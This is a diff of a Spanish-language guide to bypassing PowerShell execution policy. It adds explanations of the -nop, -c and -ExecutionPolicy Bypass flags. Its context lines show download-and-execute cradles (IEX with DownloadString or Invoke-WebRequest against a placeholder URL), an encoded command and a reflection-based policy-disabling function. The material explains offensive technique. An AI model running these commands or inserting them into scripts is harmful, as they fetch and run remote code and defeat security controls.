@@ -106,8 +106,8 @@ PowerShell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIARQBzAHQAbwAgAGUAcwAgAHUAbgAg
 powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('URL')"
 powershell -nop -c "IEX(Invoke-WebRequest -Uri 'URL' -UseBasicParsing).Content"
 ```
-- -nop: noprofile
-- -c: command
+- -nop: noprofile (ignora los comandos en el archivo de perfil)
+- -c: command (ejecuta una instrucción de comandos)
 ![6_bypass_ps_executionpolicy](screenshots/6_bypass_ps_executionpolicy.png)
 
 
@@ -122,6 +122,7 @@ Function Disable-ExecutionPolicy {($ctx = $executionContext.GetType().GetField("
 ```ps
 PowerShell.exe -ExecutionPolicy Bypass -File .\BypassEP.ps1
 ```
+- -ExecutionPolicy Bypass o –Exec BypassBypass: omitir/ignora la política de ejecución como Restringido, que restringe la ejecución de los scripts de PowerShell.
 ![8_bypass_ps_executionpolicy](screenshots/8_bypass_ps_executionpolicy.png)
 
 
